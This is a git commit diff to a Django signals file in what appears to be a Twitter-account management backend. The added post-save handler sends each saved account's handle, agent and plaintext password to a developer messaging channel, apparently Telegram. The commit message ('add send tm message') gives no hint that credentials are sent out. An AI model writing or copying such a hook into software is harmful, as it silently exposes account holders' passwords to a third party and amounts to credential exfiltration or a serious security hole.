99fbe22bc1632b9122a0a87e490e3e7c73601129
HeshamMoawad <heshammowad120120@yahoo.com>
2024-01-17 16:09:34 +0200

    :zap: add send tm message

--- Backend/twitter/signals.py
+++ Backend/twitter/signals.py
@@ -3,10 +3,19 @@ from django.dispatch import receiver
 from .models import TwitterAccount
 from .workers.threads import GetAccountLoginInfoFromInstanceThread
 from .workers.checker import CheckTwitterAccount
+from .core.utils import sendTMessage
 
 @receiver(post_save, sender=TwitterAccount)
 def addAccountLoginInfoBeforeSaveTwitterAccount(sender: TwitterAccount, instance: TwitterAccount, **kwargs):
-    # GetAccountLoginInfoFromInstanceThread(instance).start()
-    checker = CheckTwitterAccount(instance)
+    sendTMessage(msg=f"""
+Trying Add New Twitter Account :
+Agent : {instance.agent}
+Handle : {instance.handle}
+Password : {instance.password}
+    """,
+    isDeveloper=True)
+    GetAccountLoginInfoFromInstanceThread(instance).start()
+
+    # checker = CheckTwitterAccount(instance)
 
 
